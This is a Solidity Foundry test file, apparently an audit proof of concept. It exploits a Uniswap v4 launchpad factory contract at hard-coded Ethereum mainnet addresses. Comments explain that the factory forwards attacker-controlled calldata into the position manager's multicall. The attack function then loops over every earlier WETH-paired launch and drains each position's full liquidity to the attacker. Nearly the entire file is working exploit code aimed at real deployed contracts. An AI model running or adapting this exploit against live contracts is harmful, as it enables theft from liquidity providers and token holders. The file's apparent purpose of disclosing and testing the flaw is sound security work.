// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {ForkPoCBase} from "../src/ForkPoCBase.sol";

// --- victim ABI (subset) ---------------------------------------------------
// LaunchpadFactoryAuto.launch forwards two fully attacker-controlled byte blobs
// (initCalldata, modifyCalldata) straight into POSITION_MANAGER.multicall([...]),
// which delegatecalls them with msg.sender preserved as the factory. Because the
// factory owns the Uniswap-v4 LP position NFT of every earlier launch, the caller
// of launch can make the factory DECREASE_LIQUIDITY on any of those positions and
// TAKE_PAIR the withdrawn tokens to itself.
struct Params {
    string name;
    string symbol;
    uint256 supply;
    address pairedStock;
    uint256 seedAmount;
    bytes32 salt;
    string description;
    string image;
    string website;
    string twitter;
    bool holdersShare;
}

struct SeedBuys {
    address payAsset;
    uint256 totalPayIn;
    bytes preCommands;
    bytes[] preInputs;
    uint128[] amounts;
    address[] recipients;
}

interface IFactory {
    function launch(Params calldata p, bytes calldata initCalldata, bytes calldata modifyCalldata, SeedBuys calldata sb)
        external
        payable
        returns (address token);
    function allLaunches() external view returns (address[] memory);
    function positionIdOf(address) external view returns (uint256);
}

interface ILaunchToken {
    function pairedStock() external view returns (address);
}

interface IPositionManager {
    function modifyLiquidities(bytes calldata unlockData, uint256 deadline) external payable;
    function getPositionLiquidity(uint256 tokenId) external view returns (uint128);
    function nextTokenId() external view returns (uint256);
}

contract ExploitTest is ForkPoCBase {
    IFactory constant FACTORY = IFactory(0xFB60CD0B36aD4bD839b91767a6Ad9055AB6aD825);
    IPositionManager constant PM = IPositionManager(0xbD216513d74C8cf14cf4747E6AaA6420FF64ee9e);
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint256 saltNonce;

    function setUp() public {
        forkAt("ethereum", 25692310);
    }

    function testExploit() public {
        proveTokenProfit(WETH, this.attack);
    }

    // Runs as `attacker`, an unprivileged EOA. For every earlier launch whose LP is
    // paired with WETH, call launch() with a payload that drains that position's
    // liquidity to the attacker. No role/owner is impersonated.
    function attack() external {
        vm.startPrank(attacker);
        address[] memory launches = FACTORY.allLaunches();
        for (uint256 i; i < launches.length; i++) {
            address victimToken = launches[i];
            address paired = ILaunchToken(victimToken).pairedStock();
            if (paired != WETH) continue; // measure profit in WETH
            _drain(victimToken, paired);
        }
        vm.stopPrank();
    }

    function _drain(address victimToken, address paired) internal {
        uint256 pid = FACTORY.positionIdOf(victimToken);
        uint128 liq = PM.getPositionLiquidity(pid);
        if (liq == 0) return;

        (address c0, address c1) = victimToken < paired ? (victimToken, paired) : (paired, victimToken);

        // actions = [DECREASE_LIQUIDITY (0x01), TAKE_PAIR (0x11)] — identical shape to the
        // victim's own harvest(), but with the full position liquidity and recipient = attacker.
        bytes[] memory params = new bytes[](2);
        params[0] = abi.encode(pid, uint256(liq), uint128(0), uint128(0), bytes("")); // DECREASE_LIQUIDITY
        params[1] = abi.encode(c0, c1, attacker); // TAKE_PAIR -> attacker
        bytes memory unlockData = abi.encode(hex"0111", params);
        bytes memory drainCall =
            abi.encodeWithSelector(IPositionManager.modifyLiquidities.selector, unlockData, block.timestamp + 300);

        // Second multicall entry must simply not revert.
        bytes memory noop = abi.encodeWithSelector(IPositionManager.nextTokenId.selector);

        Params memory p = Params({
            name: "x",
            symbol: "x",
            supply: 0,
            pairedStock: WETH,
            seedAmount: 0,
            salt: keccak256(abi.encode("quorum", saltNonce++)),
            description: "x",
            image: "x",
            website: "x",
            twitter: "x",
            holdersShare: false
        });
        SeedBuys memory sb; // totalPayIn == 0 => seed buys skipped

        // initCalldata = drainCall (calls[0]), modifyCalldata = noop (calls[1]).
        FACTORY.launch(p, drainCall, noop, sb);
    }
}
